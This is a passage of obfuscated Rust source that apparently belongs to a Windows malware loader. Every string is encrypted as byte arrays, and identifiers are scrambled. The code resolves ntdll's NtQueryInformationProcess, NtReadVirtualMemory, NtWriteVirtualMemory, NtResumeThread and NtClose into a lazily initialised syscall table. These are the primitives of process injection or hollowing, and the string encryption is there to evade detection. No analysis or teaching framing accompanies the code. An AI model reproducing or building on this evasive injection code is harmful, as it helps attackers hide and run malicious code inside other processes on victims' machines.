, 177 , 201 , 208 , 126 , 252 , 78 , 170 , 99 , 111 , 89 , 173 , 41 , 55 , 189 , 36 , 98 , 84 , 229 , 252 , 182 , 175 , 7 , 177 , 17 , 156 , 201 , 214 , 197 , 227 , 146 , 91 , 6 , 181 , 156 , 25 , 118 , 75 , 38 , 38 , 82 , 202 , 210 , 89 , 83 , 206 , 176 , 22 , 242 , 131 , 240] , & [141 , 121 , 7 , 208 , 128 , 153 , 230 , 241 , 132 , 152 , 254 , 254 , 35 , 103 , 12 , 191 , 118 , 45 , 149 , 122 , 223 , 68 , 84 , 39 , 49 , 217 , 143 , 236 , 192 , 65 , 255 , 221 , 56 , 216 , 219 , 205 , 130 , 168 , 165 , 10 , 243 , 84 , 183 , 5 , 172 , 2 , 94 , 25 , 166 , 8 , 14 , 200 , 132 , 102 , 64 , 147 , 70 , 108 , 200 , 246 , 25 , 169 , 130 , 220 , 44 , 186 , 120 , 42 , 184 , 176 , 228 , 125 , 116 , 177 , 185 , 117 , 13 , 48 , 193 , 109 , 55 , 187 , 39 , 146 , 115 , 76 , 200 , 214] , 23742579213193u64) . as_ptr ()) ; if ntdll == 0 { return Err (decode_ypitq_dgsufrf (& [104 , 14 , 139 , 135 , 104 , 99 , 193 , 23 , 21 , 81 , 247 , 244 , 18 , 156 , 254 , 255 , 213 , 146 , 55 , 160 , 176 , 220 , 121 , 25 , 160 , 35 , 247 , 145 , 99 , 157 , 74 , 165 , 19 , 78 , 70 , 76 , 35 , 160 , 250 , 6 , 31 , 255 , 8 , 52 , 210 , 113 , 219 , 216 , 150 , 93 , 14 , 207 , 154 , 156 , 233 , 142 , 105 , 221 , 46 , 76 , 93 , 206 , 255 , 163 , 13 , 254 , 195 , 0 , 219 , 234 , 85 , 151 , 157 , 185 , 0 , 191 , 217 , 5 , 147 , 30 , 152 , 187 , 231 , 197 , 14 , 112 , 176 , 159 , 210 , 41 , 166 , 53 , 228 , 218 , 193 , 242 , 144 , 84 , 182 , 201 , 34 , 160 , 138 , 67 , 21 , 232 , 11 , 68 , 114 , 39 , 169 , 103 , 233 , 45 , 37 , 178 , 115 , 248 , 146 , 111 , 196 , 137 , 136 , 191 , 45 , 5 , 68 , 77 , 182 , 104 , 41 , 80 , 151 , 23 , 205 , 207 , 9 , 241 , 71 , 224 , 96 , 99 , 93 , 54 , 17 , 166 , 5 , 145 , 157 , 122 , 216 , 95 , 254 , 146 , 254 , 57 , 18 , 226 , 137 , 175 , 245 , 82 , 82 , 2 , 33 , 80 , 172 , 189 , 159 , 235 , 68 , 33 , 13 , 41 , 220 , 247 , 85 , 89 , 231 , 141 , 53 , 145 , 88 , 194 , 160 , 93 , 123 , 245 , 185 , 214 , 153 , 180 , 66 , 241 , 102 , 169 , 16 , 124 , 48 , 166 , 207 , 145 , 136 , 134 , 54 , 209 , 250 , 197 , 224 , 107 , 22 , 244 , 38 , 195 , 174 , 246 , 242 , 182 , 64 , 198 , 53 , 55 , 242 , 24 , 195 , 102 , 131 , 62 , 104 , 102 , 236 , 200 , 121 , 134 , 184 , 243 , 76 , 215 , 234 , 98 , 85 , 227 , 221 , 81 , 128 , 156 , 198 , 228 , 114 , 111 , 69 , 142 , 90 , 165 , 13 , 199 , 108 , 180 , 127 , 189 , 215 , 142 , 8 , 198 , 45 , 215 , 236 , 76 , 47 , 38 , 119 , 152 , 20 , 0 , 183 , 2 , 29 , 208 , 28 , 95 , 29 , 36 , 212 , 153 , 147 , 36 , 9 , 242] , & [89 , 214 , 206 , 138 , 52 , 144 , 75 , 14 , 182 , 158 , 16 , 241 , 252 , 161 , 131 , 155 , 100 , 31 , 247 , 237 , 32 , 248 , 152 , 148 , 104 , 45 , 206 , 255 , 157 , 60 , 205 , 42 , 97 , 77 , 37 , 220 , 166 , 177 , 148 , 199 , 99 , 114 , 76 , 254 , 83 , 110 , 110 , 38 , 102 , 52 , 247 , 231 , 54 , 112 , 39 , 68 , 31 , 207 , 206 , 21 , 250 , 48 , 232 , 187 , 65 , 162 , 13 , 167 , 34 , 82 , 249 , 86 , 229 , 117 , 155 , 202 , 39 , 141 , 47 , 73 , 31 , 25 , 53 , 132 , 158 , 2 , 160 , 59] , 117639154239665u64)) ; } let NtQueryInformationProcess = GetProcAddress (ntdll , decode_ypitq_dgsufrf (& [230 , 170 , 55 , 248 , 187 , 126 , 106 , 87 , 132 , 222 , 175 , 41 , 108 , 159 , 91 , 101 , 175 , 8 , 219 , 94 , 248 , 243 , 213 , 196 , 91 , 231 , 133 , 37 , 200 , 62 , 217 , 183 , 6 , 106 , 89 , 190 , 117 , 23 , 91 , 210 , 13 , 42 , 113 , 157 , 237 , 174 , 230 , 188 , 208 , 117 , 7 , 118 , 194 , 4 , 170 , 196 , 150 , 26 , 98 , 99 , 106 , 126 , 34 , 194 , 219 , 68 , 149 , 53 , 237 , 114 , 245 , 175 , 151 , 137 , 80 , 124 , 89 , 164 , 26 , 110 , 96 , 69 , 31 , 179 , 72 , 129 , 97 , 16 , 19 , 195 , 138 , 101 , 43 , 180 , 210 , 10 , 118 , 235 , 125 , 98 , 66 , 55 , 205 , 4 , 147 , 117 , 241 , 13 , 228 , 28 , 53 , 186 , 64 , 155 , 131 , 106 , 130 , 83 , 116 , 176 , 206 , 99 , 242 , 3 , 23 , 45 , 17 , 243 , 92 , 208 , 110 , 184 , 246 , 26 , 140 , 191 , 220 , 28 , 187 , 118 , 66 , 75 , 62 , 162 , 16 , 35 , 164 , 206 , 155 , 39 , 134 , 12 , 64 , 15 , 249 , 200 , 3 , 162 , 69 , 65 , 193 , 74 , 59 , 52 , 149 , 29 , 119 , 193 , 167 , 215 , 219 , 192 , 149 , 130 , 84 , 229 , 185 , 193 , 37 , 131 , 180 , 65 , 76 , 232 , 54 , 123 , 87 , 136 , 162 , 102 , 174 , 119 , 225 , 61 , 60 , 226 , 133 , 109 , 199 , 178 , 43 , 171 , 17 , 199 , 182 , 245 , 137 , 249 , 117 , 58 , 153 , 230 , 42 , 241 , 100 , 116 , 121 , 80 , 219 , 231 , 64 , 141 , 56 , 48 , 97 , 46 , 141 , 104 , 97 , 250 , 247 , 99 , 248 , 74 , 86 , 85 , 126 , 140 , 1 , 1 , 98 , 162 , 97 , 109 , 53 , 146 , 193 , 240 , 128 , 90 , 188 , 210 , 249 , 39 , 188 , 175 , 119 , 122 , 214 , 110 , 88 , 249 , 251 , 207 , 239 , 91 , 131 , 109 , 24 , 220 , 137 , 116 , 71 , 246 , 15 , 78 , 24 , 62 , 147 , 36 , 38 , 140 , 120 , 23 , 62 , 190 , 83 , 175 , 164 , 118 , 105 , 178 , 165 , 168 , 103 , 56 , 176 , 33 , 185 , 206 , 125 , 227 , 117 , 4 , 10 , 9 , 252 , 225 , 254 , 200 , 192 , 234 , 46 , 68 , 152 , 240 , 155 , 226 , 83 , 208] , & [233 , 144 , 242 , 0 , 206 , 29 , 81 , 204 , 165 , 5 , 132 , 133 , 163 , 128 , 239 , 58 , 184 , 68 , 54 , 149 , 59 , 143 , 144 , 48 , 173 , 106 , 74 , 213 , 78 , 89 , 146 , 164 , 51 , 212 , 200 , 52 , 7 , 131 , 113 , 5 , 225 , 140 , 135 , 109 , 65 , 199 , 24 , 134 , 161 , 113 , 41 , 104 , 37 , 24 , 212 , 230 , 244 , 218 , 176 , 139 , 150 , 255 , 165 , 8 , 71 , 8 , 229 , 130 , 206 , 19 , 163 , 165 , 29 , 162 , 157 , 118 , 214 , 252 , 170 , 206 , 193 , 240 , 57 , 66 , 94 , 0 , 73 , 30] , 155580895332926u64) . as_ptr ()) ; let NtClose = GetProcAddress (ntdll , decode_ypitq_dgsufrf (& [156 , 216 , 240 , 253 , 73 , 125 , 163 , 17 , 180 , 127 , 139 , 91 , 170 , 46 , 18 , 248 , 213 , 25 , 74 , 109 , 139 , 55 , 122 , 144 , 109 , 98 , 64 , 209 , 238 , 127 , 130 , 204 , 137 , 64 , 161 , 45 , 164 , 131 , 94 , 81 , 86 , 21 , 91 , 81 , 201 , 215 , 134 , 205 , 148 , 161 , 150 , 246 , 126 , 234 , 97 , 144 , 136 , 21 , 59 , 28 , 87 , 186 , 136 , 91 , 19 , 18 , 28 , 202 , 66 , 111 , 244 , 224 , 48 , 196 , 63 , 173 , 152 , 8 , 245 , 48 , 200 , 79 , 96 , 112 , 144 , 78 , 174 , 15 , 93 , 82 , 47 , 88 , 63 , 212 , 120 , 6 , 119 , 249 , 217 , 254 , 53 , 51 , 209 , 55 , 221 , 144 , 106 , 188 , 51 , 206 , 189 , 31 , 149 , 41 , 20 , 213 , 79 , 15 , 230 , 239 , 179 , 163 , 195 , 247 , 171 , 88 , 32 , 231] , & [118 , 40 , 55 , 26 , 228 , 53 , 16 , 178 , 132 , 47 , 226 , 76 , 243 , 92 , 30 , 69 , 117 , 97 , 252 , 95 , 2 , 12 , 37 , 185 , 136 , 114 , 59 , 135 , 255 , 249 , 191 , 217 , 79 , 213 , 234 , 219 , 22 , 62 , 153 , 148 , 4 , 100 , 235 , 105 , 23 , 59 , 134 , 155 , 147 , 138 , 75 , 157 , 166 , 111 , 252 , 227 , 2 , 71 , 26 , 206 , 188 , 71 , 149 , 79 , 182 , 114 , 209 , 192 , 183 , 124 , 49 , 221 , 12 , 40 , 64 , 36 , 76 , 126 , 18 , 32 , 3 , 41 , 34 , 79 , 166 , 215 , 238 , 114] , 14504104559289u64) . as_ptr ()) ; let NtReadVirtualMemory = GetProcAddress (ntdll , decode_ypitq_dgsufrf (& [107 , 142 , 141 , 240 , 4 , 51 , 212 , 155 , 67 , 147 , 106 , 173 , 162 , 34 , 247 , 10 , 26 , 209 , 128 , 248 , 35 , 155 , 7 , 82 , 179 , 151 , 213 , 216 , 105 , 142 , 189 , 229 , 179 , 108 , 63 , 124 , 218 , 197 , 90 , 57 , 186 , 89 , 217 , 23 , 8 , 34 , 34 , 83 , 53 , 105 , 99 , 21 , 24 , 131 , 26 , 5 , 88 , 238 , 167 , 156 , 136 , 229 , 90 , 51 , 13 , 4 , 32 , 96 , 39 , 162 , 74 , 201 , 109 , 189 , 209 , 247 , 200 , 48 , 1 , 32 , 65 , 150 , 128 , 166 , 103 , 129 , 232 , 172 , 72 , 22 , 237 , 175 , 162 , 39 , 11 , 188 , 176 , 89 , 117 , 226 , 49 , 36 , 168 , 108 , 140 , 18 , 198 , 166 , 216 , 81 , 193 , 73 , 232 , 37 , 188 , 164 , 199 , 123 , 205 , 102 , 119 , 195 , 249 , 27 , 233 , 204 , 172 , 96 , 110 , 192 , 223 , 149 , 73 , 177 , 199 , 159 , 68 , 232 , 59 , 55 , 107 , 11 , 101 , 35 , 19 , 135 , 77 , 117 , 123 , 243 , 155 , 15 , 10 , 136 , 97 , 93 , 12 , 227 , 252 , 208 , 156 , 171 , 149 , 227 , 85 , 149 , 126 , 61 , 7 , 59 , 146 , 102 , 98 , 188 , 61 , 175 , 131 , 80 , 216 , 79 , 58 , 227 , 23 , 216 , 144 , 76 , 171 , 22 , 235 , 26 , 24 , 180 , 24 , 60 , 200 , 206 , 41 , 23 , 36 , 99 , 154 , 0 , 249 , 32 , 248 , 245 , 194 , 25 , 77 , 182 , 93 , 15 , 232 , 108 , 120 , 150 , 202 , 243 , 64 , 31 , 161 , 94 , 196 , 173 , 58 , 65 , 146 , 238 , 195 , 115 , 50 , 233 , 34 , 200 , 75 , 1 , 121 , 8 , 165 , 154 , 24 , 159 , 73 , 241 , 59 , 244 , 199 , 54 , 250 , 111 , 101 , 163 , 221 , 217 , 189 , 34] , & [254 , 162 , 135 , 160 , 192 , 113 , 27 , 115 , 114 , 130 , 123 , 134 , 101 , 44 , 192 , 107 , 21 , 139 , 208 , 159 , 63 , 14 , 58 , 246 , 198 , 10 , 74 , 159 , 142 , 156 , 72 , 75 , 51 , 81 , 13 , 204 , 99 , 127 , 221 , 244 , 187 , 148 , 33 , 223 , 167 , 249 , 180 , 144 , 106 , 45 , 34 , 80 , 3 , 122 , 250 , 182 , 136 , 200 , 112 , 144 , 7 , 32 , 108 , 53 , 38 , 73 , 183 , 32 , 227 , 183 , 141 , 238 , 188 , 127 , 34 , 83 , 193 , 167 , 146 , 213 , 3 , 221 , 179 , 3 , 234 , 10 , 92 , 255] , 89623082567583u64) . as_ptr ()) ; let NtWriteVirtualMemory = GetProcAddress (ntdll , decode_ypitq_dgsufrf (& [48 , 82 , 184 , 105 , 86 , 248 , 211 , 240 , 173 , 202 , 188 , 111 , 106 , 95 , 59 , 135 , 71 , 217 , 244 , 115 , 101 , 3 , 0 , 249 , 234 , 5 , 205 , 178 , 203 , 147 , 84 , 71 , 170 , 170 , 79 , 143 , 104 , 223 , 179 , 253 , 213 , 190 , 38 , 136 , 252 , 13 , 175 , 232 , 217 , 71 , 47 , 15 , 49 , 221 , 58 , 95 , 104 , 129 , 113 , 194 , 92 , 171 , 201 , 152 , 212 , 180 , 147 , 195 , 84 , 200 , 87 , 117 , 92 , 41 , 53 , 56 , 62 , 78 , 181 , 166 , 62 , 253 , 66 , 115 , 255 , 106 , 220 , 199 , 131 , 36 , 93 , 117 , 19 , 234 , 105 , 98 , 71 , 170 , 211 , 1 , 238 , 246 , 171 , 17 , 117 , 11 , 74 , 87 , 161 , 79 , 88 , 181 , 76 , 157 , 194 , 188 , 206 , 9 , 169 , 67 , 135 , 57 , 35 , 50 , 206 , 108 , 26 , 169 , 184 , 32 , 163 , 123 , 65 , 240 , 4 , 236 , 171 , 103 , 90 , 80 , 120 , 10 , 3 , 0 , 196 , 27 , 75 , 241 , 251 , 223 , 50 , 173 , 152 , 74 , 211 , 118 , 226 , 16 , 18 , 33 , 202 , 83 , 25 , 191 , 66 , 83 , 147 , 48 , 184 , 53 , 199 , 111 , 206 , 89 , 254 , 55 , 154 , 232 , 117 , 181 , 228 , 67 , 108 , 58 , 170 , 163 , 29 , 74 , 232 , 128 , 145 , 199 , 73 , 59 , 43 , 30 , 7 , 102 , 191 , 240 , 50 , 20 , 134 , 205 , 188 , 239 , 179 , 254 , 200 , 248 , 150 , 217 , 246 , 136 , 228 , 211 , 195 , 224 , 88 , 5 , 110 , 87 , 246 , 228 , 244 , 55 , 211 , 253 , 203 , 75 , 128 , 217 , 24 , 141 , 32 , 156 , 172 , 138 , 166 , 251 , 0 , 192 , 205 , 48 , 154 , 230 , 232 , 106 , 12 , 74 , 45 , 245 , 235 , 142 , 60 , 141] , & [213 , 127 , 221 , 197 , 79 , 1 , 200 , 205 , 116 , 78 , 92 , 159 , 134 , 167 , 61 , 236 , 188 , 253 , 57 , 131 , 42 , 52 , 213 , 43 , 143 , 238 , 58 , 88 , 105 , 43 , 253 , 215 , 152 , 77 , 37 , 125 , 50 , 20 , 226 , 49 , 184 , 250 , 128 , 196 , 113 , 52 , 57 , 251 , 202 , 239 , 188 , 165 , 156 , 147 , 22 , 141 , 37 , 223 , 123 , 29 , 123 , 57 , 61 , 22 , 190 , 50 , 214 , 141 , 182 , 81 , 243 , 136 , 80 , 254 , 18 , 196 , 13 , 251 , 90 , 69 , 217 , 141 , 120 , 175 , 254 , 124 , 172 , 174] , 101696235636782u64) . as_ptr ()) ; let NtResumeThread = GetProcAddress (ntdll , decode_ypitq_dgsufrf (& [142 , 139 , 132 , 106 , 9 , 41 , 169 , 7 , 9 , 160 , 237 , 10 , 236 , 105 , 133 , 183 , 36 , 112 , 66 , 33 , 178 , 210 , 49 , 140 , 119 , 64 , 18 , 76 , 248 , 184 , 170 , 1 , 202 , 160 , 219 , 190 , 75 , 204 , 12 , 32 , 174 , 150 , 82 , 185 , 224 , 113 , 28 , 4 , 81 , 206 , 70 , 51 , 166 , 81 , 108 , 248 , 138 , 78 , 12 , 125 , 106 , 149 , 213 , 94 , 67 , 244 , 250 , 248 , 15 , 210 , 91 , 68 , 146 , 48 , 165 , 39 , 222 , 37 , 242 , 3 , 219 , 198 , 194 , 11 , 120 , 251 , 8 , 247 , 50 , 18 , 47 , 9 , 117 , 131 , 204 , 108 , 99 , 147 , 221 , 36 , 82 , 2 , 80 , 179 , 230 , 34 , 155 , 145 , 141 , 215 , 139 , 103 , 48 , 43 , 253 , 113 , 166 , 85 , 124 , 91 , 90 , 229 , 232 , 34 , 114 , 55 , 189 , 77 , 186 , 134 , 79 , 156 , 119 , 9 , 241 , 67 , 106 , 95 , 195 , 125 , 198 , 174 , 222 , 78 , 148 , 93 , 72 , 59 , 67 , 16 , 120 , 37 , 54 , 135 , 138 , 227 , 46 , 117 , 179 , 114 , 218 , 216 , 60 , 187 , 60 , 190 , 62 , 94 , 175 , 144 , 18 , 88 , 108 , 253 , 36 , 46 , 252 , 78 , 210 , 124 , 248 , 87 , 240 , 141 , 201 , 113 , 153 , 141 , 75 , 230 , 81 , 123] , & [58 , 122 , 89 , 225 , 244 , 29 , 219 , 7 , 5 , 137 , 167 , 197 , 100 , 149 , 198 , 17 , 99 , 65 , 77 , 135 , 149 , 52 , 92 , 242 , 130 , 4 , 200 , 39 , 218 , 54 , 86 , 3 , 63 , 201 , 94 , 39 , 11 , 104 , 207 , 33 , 205 , 243 , 197 , 191 , 104 , 103 , 171 , 228 , 83 , 243 , 136 , 168 , 20 , 200 , 101 , 28 , 125 , 205 , 155 , 126 , 147 , 225 , 193 , 80 , 52 , 96 , 162 , 8 , 94 , 132 , 205 , 250 , 115 , 174 , 176 , 191 , 125 , 120 , 218 , 166 , 180 , 68 , 18 , 56 , 93 , 207 , 201 , 30] , 51488067945868u64) . as_ptr ()) ; if NtQueryInformationProcess . is_none () || NtClose . is_none () || NtReadVirtualMemory . is_none () || NtWriteVirtualMemory . is_none () || NtResumeThread . is_none () { return Err (decode_ypitq_dgsufrf (& [193 , 244 , 50 , 215 , 7 , 218 , 176 , 82 , 26 , 156 , 173 , 107 , 142 , 228 , 147 , 232 , 89 , 198 , 160 , 145 , 219 , 76 , 120 , 7 , 52 , 11 , 8 , 38 , 189 , 215 , 20 , 154 , 219 , 230 , 187 , 228 , 250 , 219 , 92 , 120 , 92 , 242 , 176 , 187 , 126 , 195 , 81 , 222 , 139 , 61 , 92 , 66 , 217 , 243 , 170 , 207 , 57 , 140 , 135 , 157 , 173 , 21 , 150 , 171 , 94 , 118 , 199 , 95 , 211 , 129 , 54 , 88 , 249 , 102 , 181 , 88 , 103 , 235 , 118 , 178 , 156 , 254 , 54 , 141 , 236 , 137 , 146 , 141 , 72 , 184 , 119 , 76 , 95 , 56 , 71 , 75 , 192 , 23 , 145 , 205 , 203 , 0 , 239 , 33 , 87 , 0 , 82 , 247 , 52 , 162 , 220 , 98 , 118 , 128 , 239 , 178 , 76 , 25 , 215 , 254 , 208 , 172 , 104 , 170 , 221 , 5 , 28 , 247 , 47 , 216 , 213 , 43 , 242 , 190 , 179 , 71 , 95 , 46 , 0 , 207 , 189 , 100 , 33 , 245 , 165 , 81 , 107 , 45 , 255 , 79 , 22 , 65 , 62 , 109 , 24 , 164 , 237 , 124 , 101 , 36 , 20 , 33 , 24 , 67 , 129 , 200 , 30 , 100 , 228 , 171 , 74 , 13 , 128 , 74 , 164 , 110 , 37 , 45 , 185 , 191 , 124 , 242 , 111 , 203 , 204 , 87 , 59 , 177 , 24 , 137 , 35 , 46 , 203 , 128 , 203 , 223 , 18 , 141 , 188 , 151 , 70 , 89 , 246 , 250 , 75 , 148 , 255 , 67 , 59 , 125 , 102 , 29 , 101 , 213 , 76 , 140 , 107 , 74 , 85 , 205 , 23 , 207 , 211 , 91 , 145 , 131 , 186 , 141 , 105 , 238 , 239 , 124 , 50 , 216 , 108 , 58 , 79 , 234 , 239 , 42 , 86 , 18 , 189 , 214 , 119 , 229 , 120 , 253 , 134 , 50 , 13 , 199 , 218 , 22 , 195 , 18 , 201 , 200 , 197 , 74 , 148 , 155 , 64 , 159 , 12 , 181 , 241 , 115 , 185 , 118 , 69 , 45 , 78 , 2 , 140 , 2 , 245 , 40 , 197 , 3 , 19 , 220 , 229 , 97 , 149 , 23 , 125 , 181 , 44 , 114 , 33 , 49 , 247 , 90 , 121 , 228 , 20 , 77 , 33 , 168 , 112 , 148 , 170 , 57 , 21 , 68 , 217 , 255 , 243 , 109 , 185 , 203 , 233 , 250 , 194 , 175 , 6 , 16 , 17 , 134 , 187 , 251 , 35 , 206 , 56 , 155 , 174 , 226 , 172 , 205 , 100 , 92 , 194 , 134 , 239 , 88 , 112 , 48 , 52 , 179 , 96 , 134 , 83 , 117 , 35 , 85 , 42 , 36 , 179 , 12 , 124 , 113 , 236 , 82 , 22 , 59 , 117 , 106 , 104 , 157 , 26 , 53 , 95 , 229 , 203 , 113 , 187 , 171 , 120 , 139 , 182 , 25 , 245 , 68 , 30 , 156 , 127 , 182 , 56 , 147 , 93 , 130 , 26 , 58 , 93 , 107 , 29 , 225 , 166 , 98 , 10 , 70 , 105 , 230 , 52 , 221 , 186 , 174 , 127 , 233 , 233 , 93 , 255 , 157 , 234 , 61 , 80 , 172 , 237 , 42 , 239 , 208 , 232 , 139 , 249 , 223 , 35 , 103 , 140 , 84 , 138 , 143 , 223 , 106 , 177 , 106 , 126 , 60 , 127 , 39 , 160 , 121 , 6 , 86 , 163 , 86 , 222 , 145 , 54 , 175 , 89 , 23 , 155 , 61 , 228 , 82 , 120 , 1 , 93 , 35 , 178 , 203 , 164 , 74 , 182 , 87 , 214 , 221 , 89 , 57 , 253 , 96 , 44 , 15 , 118 , 138 , 124 , 69 , 22 , 123 , 247 , 116 , 57 , 149 , 192 , 165 , 75 , 31 , 8 , 168 , 240 , 180 , 11 , 78 , 156 , 238 , 108 , 128 , 17 , 141 , 242 , 121 , 118 , 77 , 66 , 22 , 154 , 5 , 110 , 124 , 241 , 131 , 60 , 101 , 145 , 67 , 33 , 48 , 228 , 65 , 18 , 116] , & [12 , 248 , 25 , 66 , 95 , 141 , 23 , 100 , 108 , 152 , 174 , 106 , 123 , 230 , 97 , 254 , 216 , 60 , 252 , 196 , 105 , 32 , 137 , 23 , 22 , 14 , 163 , 174 , 222 , 187 , 106 , 107 , 175 , 191 , 45 , 22 , 227 , 58 , 208 , 140 , 203 , 112 , 247 , 60 , 223 , 212 , 31 , 46 , 144 , 174 , 195 , 166 , 204 , 51 , 62 , 47 , 72 , 12 , 43 , 216 , 124 , 238 , 102 , 152 , 113 , 16 , 16 , 40 , 9 , 118 , 119 , 157 , 250 , 30 , 184 , 109 , 248 , 221 , 231 , 191 , 117 , 30 , 14 , 40 , 42 , 35 , 68 , 232] , 107404247175235u64)) ; } Ok (Syscalls { NtQueryInformationProcess : transmute (NtQueryInformationProcess . unwrap ()) , NtClose : transmute (NtClose . unwrap ()) , NtReadVirtualMemory : transmute (NtReadVirtualMemory . unwrap ()) , NtWriteVirtualMemory : transmute (NtWriteVirtualMemory . unwrap ()) , NtResumeThread : transmute (NtResumeThread . unwrap ()) , }) } } } pub static dn_n_uelun : Lazy < Syscalls > = Lazy :: new (| | { Syscalls :: new () . expect ("") }) ;
fn main() { x_gctkduh(); }